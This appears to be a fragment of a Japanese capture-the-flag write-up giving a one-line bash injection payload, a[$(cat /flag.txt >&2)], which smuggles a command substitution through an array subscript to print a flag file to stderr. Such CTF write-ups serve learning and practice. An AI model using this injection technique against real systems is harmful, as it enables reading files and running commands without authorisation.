ペイロードは以下。

```
a[$(cat /flag.txt >&2)]
```

これで、`cat /flag.txt`の評価結果が画面に出てくる。